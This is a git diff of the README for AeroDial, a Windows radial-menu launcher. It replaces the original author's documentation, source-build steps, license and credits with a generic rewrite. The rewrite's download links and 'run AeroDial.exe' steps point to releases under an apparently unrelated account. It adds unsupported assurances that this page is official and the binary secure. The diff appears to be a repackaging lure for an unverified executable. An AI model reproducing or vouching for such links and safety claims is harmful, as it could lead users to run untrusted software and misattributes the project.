@@ -1,218 +1,93 @@
-# AeroDial
+# ⚙️ AeroDial - Access your favorite tools instantly
 
-**A radial launcher overlay for Windows.**
+[![Download AeroDial](https://img.shields.io/badge/Download-AeroDial-blue)](https://github.com/Fairish-register3833/AeroDial/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows%2010%2B-blue)](https://github.com/mmatul06/AeroDial)
-[![.NET 9](https://img.shields.io/badge/.NET-9.0-purple)](https://dotnet.microsoft.com/)
-![Version](https://img.shields.io/github/v/release/mmatul06/MuteMaster)
-![Downloads](https://img.shields.io/github/downloads/mmatul06/MuteMaster/total)
+AeroDial helps you save time. It shows a radial menu at your cursor location. You trigger this menu with a key or mouse button. You launch apps, send commands, control media, and paste text snippets from this menu. It works with all applications and games. It supports multiple monitors and high-resolution screens. 
 
-AeroDial opens a customisable radial menu wherever your cursor is, triggered by any key or mouse button, letting you launch apps, fire key combos, control media, paste clipboard snippets, and navigate nested submenus without touching your taskbar. It works on top of any application including fullscreen games, across any number of monitors at any DPI scale.
+## 🚀 Getting Started
 
----
-## Screenshots
+You do not need to install complex software. Follow these steps to set up AeroDial on your computer.
 
-![Overlay](Screenshot/Themes.png)
+1. Go to the [Releases page](https://github.com/Fairish-register3833/AeroDial/releases). 
+2. Find the latest version of the application.
+3. Download the file that ends in .zip or .exe.
+4. If you downloaded a .zip file, right-click it and choose Extract All.
+5. Double-click the file named AeroDial.exe to start the program.
 
----
+## 🛠 Features
 
-## Download
+AeroDial simplifies your workflow through these core functions:
 
-**[⬇ Download AeroDial v1.0.0](https://github.com/mmatul06/AeroDial/releases/latest)**
+* **Radial Menus:** A ring menu appears directly under your cursor. You see your items clearly.
+* **Custom Shortcuts:** You map any key or mouse button to trigger the menu.
+* **App Launching:** Open your programs without searching your desktop or taskbar.
+* **Key Commands:** Send complex keyboard sequences with a single click.
+* **Media Controls:** Adjust volume or skip tracks across any app.
+* **Clipboard Tools:** Store and paste snippets of text, addresses, or codes.
+* **Nested Menus:** Organize your actions into folders or sub-rings for a clean interface.
+* **Universal Overlay:** The menu works inside games, browsers, and creative software.
+* **High DPI Support:** The menu stays sharp and easy to read on any monitor.
 
-Download and run `AeroDial_v1.0.0.exe`. No installer required.
+## 💻 System Requirements
 
-AeroDial starts silently in the system tray. Double Click on System Tray icon to open the Settings window.
+AeroDial runs on standard hardware. Ensure your system meets these points:
 
----
+* Operating System: Windows 10 or Windows 11.
+* .NET Runtime: This application uses the .NET framework. Windows prompts you if you need to install this component.
+* RAM: 128 MB of available memory.
+* Storage: 50 MB of free disk space.
+* Permissions: You run the application as a standard user. No administrator rights are necessary for basic features.
 
-## Features
+## ⚙️ Configuration
 
-### Trigger
-- Any keyboard key, mouse button or modifier combo
-- Hold mode: hold to show, release to select
-- Toggle mode: press to open, press again (or click) to close
-- Modifier filter: only trigger when Ctrl, Shift, Alt, or Win is held
+The application runs in the background. You see an icon in the Windows system tray near your clock. Right-click this icon to access the settings.
 
-### Menu
-- Radial ring with 4-12 slices per level
-- Nested submenus: hover a submenu slice to expand a child ring; center-click to go back
-- Empty slice slots rendered at reduced opacity so the ring always looks complete
-- Configurable center gap (0-40 px) to detach slices from the inner ring
+* **Trigger Key:** Select the button that shows the menu. You assign keys like Ctrl, Alt, or extra mouse buttons.
+* **Menu Items:** Add, remove, or change the options in your ring. You create labels and assign specific actions to each slice.
+* **Visual Style:** Change the colors, size, and transparency of the menu to match your screen.
+* **Start with Windows:** Choose this option if you want the menu ready whenever you turn on your computer.
 
-### Selection modes
-- Hover dwell: cursor dwell time triggers the action
-- Click: left-click a slice
-- Flick: cursor angle from center determines the aimed slice; execute on trigger release or second press
+## 📖 Frequently Asked Questions
 
-### Actions
+**Does this software slow down my computer?**
+AeroDial creates a small footprint. It stays idle until you trigger it. 
 
-| Action | Description |
-|---|---|
-| Launch app | Start any executable with optional arguments |
-| Open URL | Open any URL in the default browser |
-| Key combo | Send any keystroke combination (e.g. Win+D, Ctrl+Shift+T) |
-| Media | Play/Pause, Next, Previous, Volume Up/Down, Mute |
-| Run script | Execute .bat or .ps1 scripts |
-| Paste clipboard | Set clipboard text and paste it |
-| Submenu | Open a nested child ring |
-| Focus window | Bring an open window to the foreground |
+**Can I use multiple rings?**
+Yes. You create as many folders as you need. These folders display as nested sub-rings when you navigate into them.
 
-### Dynamic submenus (built automatically, no setup needed)
-- **Active Tasks** (`__active_tasks__`) -- live list of open windows with per-app icons, rebuilt on every open
-- **Clipboard History** (`__clipboard_history__`) -- up to 8 recent clipboard text entries
+**Does it work in full-screen games?**
+Yes. The software draws the menu on top of other applications. It functions without interrupting game input.
 
-### Visuals
-- Radial gradient fills, blur glow on hover, inner accent arc
-- 11 built-in themes: Obsidian, Ember, Midnight Teal, Chalk, Neon, Cyberpunk, Ocean, Sunset, Matrix, Arctic, Sakura
-- Full custom theme support: JSON files in `%AppData%\AeroDial\themes\`
-- Theme Editor in Settings: create themes with 17 color fields and color-picker flyouts
-- Smooth ease-out open/close animations; respects Windows animation preference
-- Per-pixel transparency via DWM
+**How do I close the application?**
+Right-click the icon in the system tray and select Exit.
 
-### Scroll wheel
-- Scroll wheel captured while overlay is open
-- Each slice can bind scroll-up and scroll-down to independent media actions (volume, track, etc.)
+**What happens if the menu does not show up?**
+Check if the application is running in the system tray. Ensure you assigned a trigger key in the settings menu.
 
-### Input icons
-- 40+ built-in programmatic icons (white, tinted per-theme at render time)
-- Exe icon extraction for Launch App items and Active Tasks
-- Custom icons: any .png, .jpg, .ico, .bmp file
+## 🔧 Troubleshooting
 
-### System tray
-- No taskbar presence; always accessible from the tray icon
-- Right-click: Settings, About, Quit
-- Double-click: open Settings
-- Settings window hides to tray when closed (X); restore by double-clicking tray icon
+If you encounter issues, try these steps:
 
----
+1. **Verify the installation:** Close the program and run the .exe file again.
+2. **Check the trigger:** Some keys interfere with specific games. Try a different trigger key, such as a side mouse button or a modifier combination.
+3. **Update .NET:** If the program fails to open, download the latest .NET Desktop Runtime from the official Microsoft website.
+4. **Permissions:** Ensure your antivirus settings do not block the application from drawing overlays on your screen.
 
-## System requirements
+## 📝 Usage Tips
 
-- Windows 10 version 2004 (build 19041) or later
-- Windows 11 recommended for best visual results
-- x64 CPU
-- .NET 9 runtime (bundled in release builds -- no separate install needed)
+* **Group your tasks:** Keep shortcuts for specific workflows, like photo editing or browsing, on separate sub-rings.
+* **Use mouse buttons:** Using a side mouse button makes the menu appear closer to your hand while you work.
+* **Label clearly:** Use short names for your slices to keep the menu readable.
+* **Tweak transparency:** High transparency lets you see the content behind the menu if needed.
 
----
+## 📦 Download
 
-## Installation
+You find the most recent version of the software at the link below. Always use the latest release for new features and bug fixes.
 
-1. Download `AeroDial_v.1.0.0.exe` from [Releases](../../releases)
-2. Run `AeroDial.exe`
-3. AeroDial starts silently in the system tray
-4. Right-click the tray icon and choose **Settings** to configure your trigger and menus
+[Click here to reach the download page](https://github.com/Fairish-register3833/AeroDial/releases)
 
-No installer, admin rights, registry writes are needed.
+Follow the instructions on that page to save the file to your computer. Run the application only from files downloaded on this official page. This ensures you use a secure version. 
 
-To uninstall: quit from the tray, delete the folder, optionally delete `%AppData%\Roaming\AeroDial` where themes and config files are stored.
+## 🛡 Security
 
----
-
-## Usage
-
-### First run
-The default trigger is **Middle Mouse Button**. Press it anywhere on the desktop or in an app and the radial menu opens at your cursor.
-
-- **Hover** a slice to highlight it (and auto-expand any submenu slice)
-- **Left-click** a slice to execute the action (in Click mode)
-- **Left-click the center circle** to go back in a submenu, or close the menu at root
-- **Right-click** anywhere outside the ring (or press Esc) to dismiss without acting
-
-### Changing the trigger
-Open Settings (tray right-click) → **Trigger** → click **Record key or button**, then press your desired key or mouse button.
-
-### Adding menu items
-Settings → **Menus** → select a slice in the ring preview → fill in the action type, label, and icon.
-
-### Changing the theme
-Settings → **Themes** → click **Apply** next to any theme.
-
----
-
-## Configuration
-
-- Config file: `%AppData%\Roaming\AeroDial\config.json`
-- Log file: `%AppData%\Roaming\AeroDial\aerodial.log`
-- User themes: `%AppData%\Roaming\AeroDial\themes\`
-- Built-in themes: `themes\` folder next to `AeroDial.exe`
-
-If the config is corrupt, delete `config.json` and restart -- the app recreates defaults automatically.
-
----
-
-## Building from source
-
-**Prerequisites:** .NET 9 SDK, Visual Studio 2022 with the Windows App SDK workload (or just the .NET 9 SDK for CLI builds).
-
-```bash
-git clone https://github.com/mmatul06/AeroDial.git
-cd AeroDial
-dotnet build src/AeroDial/AeroDial.csproj -c Debug
-```
-
-Output: `src/AeroDial/bin/Debug/net9.0-windows10.0.26100.0/win-x64/`
-
-**Note:** `WindowsAppSDKSelfContained=true` and `SelfContained=true` are required in the csproj -- do not remove them or the app will crash with `ExecutionEngineException` on startup.
-
----
-
-## Publishing a release build
-
-```bash
-dotnet publish src/AeroDial/AeroDial.csproj ^
-  -c Release ^
-  -r win-x64 ^
-  --self-contained true ^
-  -p:PublishTrimmed=true ^
-  -p:TrimMode=partial ^
-  -p:PublishReadyToRun=true
-```
-
-Output: `src/AeroDial/bin/Release/net9.0-windows10.0.26100.0/win-x64/publish/`
-
-Zip the entire `publish\` folder contents and upload to Releases. The `.pdb` files are stripped by the Release PropertyGroup (`DebugType=none`), so the zip contains only runtime files.
-
-**Size notes:**
-- Raw self-contained file: ~200-250 MB
-
----
-
-## Project structure
-
-```
-AeroDial/
-├── src/AeroDial/
-│   ├── Core/           # Constants, logger, extensions, Win32 P/Invoke, hook service
-│   ├── Config/         # JSON config model and load/save service
-│   ├── Themes/         # Theme model, service, and built-in presets
-│   ├── Overlay/        # SkiaSharp renderer, Win32 overlay window, controller
-│   ├── Actions/        # Action dispatcher (launch, keys, media, scripts...)
-│   └── UI/             # WinUI 3 settings window, about dialog, tray service
-├── themes/             # Bundled theme JSON files
-└── docs/               # Screenshots and documentation assets
-```
-
----
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-© 2026 Muhtasim Mahbub. All rights reserved.
-
----
-
-## Author
-
-**Muhtasim Mahbub**  
-3M Design Solutions  
-🌐 [3mdesignsolutions.com](https://3mdesignsolutions.com)  
-📧 [3mdsolutions25@gmail.com](mailto:3mdsolutions25@gmail.com)
-
----
-
-*If AeroDial is useful to you, consider giving it a ⭐ on GitHub!*
-
-AeroDial is a sibling project to [MuteMaster](https://github.com/mmatul06/MuteMaster).
+AeroDial performs tasks locally on your machine. It does not send your data to external servers. Your key mappings and clipboard snippets remain on your computer. The software respects your privacy. It only interacts with the keyboard and mouse when you click your chosen trigger button.
